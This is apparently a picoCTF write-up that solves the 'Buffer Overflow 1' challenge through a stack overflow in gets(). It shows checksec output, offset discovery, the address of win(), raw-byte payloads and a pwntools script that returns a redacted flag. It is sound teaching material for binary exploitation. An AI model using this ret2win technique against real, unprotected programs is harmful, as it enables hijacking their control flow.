# Buffer Overflow 1

**Challenge link:** [picoCTF – Buffer Overflow 1](https://play.picoctf.org/practice/challenge/258?category=6&originalEvent=70&page=1)

---

## Challenge information

```text
Level:   Medium
Tags:    Binary‑Exploitation, picoCTF 2022, browser_webshell_solvable
Author:  Sanjay C / Palash Oswal

Description:

Control the return address.

Now we're cooking! You can overflow the buffer and return to the `win` function in the program.

You can view the source here and connect with it using:
    nc saturn.picoctf.net 54523
```

---

## Manual Exploitation

The challenge archive contains the following files:

```bash
$ ls -lah
 drwxrwxr-x 3 ap   ap   4.0K Apr 24 13:05 .
 drwxrwxrwt 21 root root 4.0K Apr 24 13:02 ..
 -rw-rw-r-- 1 ap   ap    16K Apr 24 11:09 vuln
 -rw-rw-r-- 1 ap   ap   769B Apr 24 11:09 vuln.c
```

`vuln` is a 32‑bit ELF binary that is **not stripped**:

```bash
$ file vuln
vuln: ELF 32‑bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=685b06b911b19065f27c2d369c18ed09fbadb543, for GNU/Linux 3.2.0, *not stripped*
```

> A binary that is *not stripped* still contains symbol information for functions and globals, which is helpful during analysis.

The source code is provided in `vuln.c`:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt", "r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf, FLAGSIZE, f);
  printf("%s", buf);
}

void vuln() {
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers crossed... Jumping to 0x%x\n",
         get_return_address());
}

int main(int argc, char **argv) {
  setvbuf(stdout, NULL, _IONBF, 0);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

`main` simply calls `vuln()`. `vuln()` is vulnerable because it declares a 32‑byte buffer and then uses the unsafe `gets`, allowing a classic buffer‑overflow. The goal is a *ret2win*: overwrite the saved return address so the program branches to `win()`.

> `gets(char *s)` reads a line from *stdin* into `s` until a newline or EOF and **performs no bounds checking**.

### Binary security settings

```bash
$ checksec --file=vuln
[*] '/tmp/ws/vuln'
    Arch:     i386‑32‑little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled (GNU_STACK executable)
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
    Stripped: No
```

No stack canary, NX is off, and there is no PIE—perfect for a beginner exploit.

### Determining the offset

Interact with the remote service:

```bash
$ nc saturn.picoctf.net 52316
Please enter your string:
AAAAAAAAAAAAAAAAAAAA
Okay, time to return... Fingers crossed... Jumping to 0x804932f
```

Locally we brute‑force the offset. Because the buffer is 32 bytes, we start there and increment by 4 bytes:

```bash
$ chmod u+x vuln
$ python3 -c 'print("A"*32)' | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x804932f

$ python3 -c 'print("A"*36)' | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x804932f

$ python3 -c 'print("A"*40)' | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
Segmentation fault (core dumped)
```

The **Jumping address** is at the same location `0x804932f`. Where points this address?

```bash
$ objdump -d -M intel vuln | grep 804932f                                                                                                                                                          
 804932f:       b8 00 00 00 00          mov    eax,0x0                                                                                                                                                                    
$ objdump --disassemble=main -M intel vuln | grep 804932f                                                                                                                                          
 804932f:       b8 00 00 00 00          mov    eax,0x0                                                                                                                                                                    
$ objdump --disassemble=main -M intel vuln 
 ...
 8049327:       83 c4 10                add    esp,0x10
 804932a:       e8 52 ff ff ff          call   8049281 <vuln>
 804932f:       b8 00 00 00 00          mov    eax,0x0          # It points here, the instruction executed after the call to vuln.
 ...
```

Instead, the **Segmentation Fault** suggests that the paylod affect the vuln stack frame information.

Continue trying until the **saved EIP** is hit.

```bash
$ python3 -c 'print("A"*48)' | ./vuln
Jumping to 0x41414141
Segmentation fault
```
At 48 bytes we overwrite EIP with `0x41414141`:

Thus, 44 bytes reach the *saved EIP*; the following 4 bytes replace it.

### Address of `win()`

```bash
$ readelf -s vuln | grep " win$"
    63: 080491f6   139 FUNC GLOBAL DEFAULT 13 win
```

Little‑endian representation: `\xf6\x91\x04\x08`.

### Crafting the payload

Python 3’s `print` uses UTF‑8:

```bash
$ python3 -c 'print("A"*44+"\xf6\x91\x04\x08")'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAö

$ python3 -c 'print("A"*44+"\xf6\x91\x04\x08")' | xxd
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000020: 4141 4141 4141 4141 4141 4141 c3b6 c291  AAAAAAAAAAAA....
00000030: 0408 0a                                  ...
```

So we must write raw bytes via `sys.stdout.buffer`:

```bash
$ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*44+b"\xf6\x91\x04\x08")' | xxd
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000020: 4141 4141 4141 4141 4141 4141 f691 0408  AAAAAAAAAAAA....
```

Submit the payload to `vuln`.

```bash
$ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*44 + b"\xf6\x91\x04\x08")' | ./vuln
Jumping to 0x80491f6
Please create 'flag.txt' in this directory with your own debugging flag.
```

> For more references about Python3 `print` binary data, follow the [https://bugs.python.org/issue34437](https://bugs.python.org/issue34437).

### Exploit script

```python
#!/usr/bin/env python3

from pwn import remote, p32

HOST, PORT = 'saturn.picoctf.net', 54523
r = remote(HOST, PORT)

print(r.recvline())
payload = b'A' * 44 + p32(0x080491f6)

r.sendline(payload)
print(r.recvall().decode())
```

Running it retrieves the flag:

```bash
$ python3 exploit.py
[+] Opening connection to saturn.picoctf.net on port 54523: Done
b'Please enter your string: \n'
[+] Receiving all data: Done (100B)
[*] Closed connection to saturn.picoctf.net port 54523
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{XXXXXXXXX_XXX_XXXX_XXXXXXXX}
```

---

ap3zzi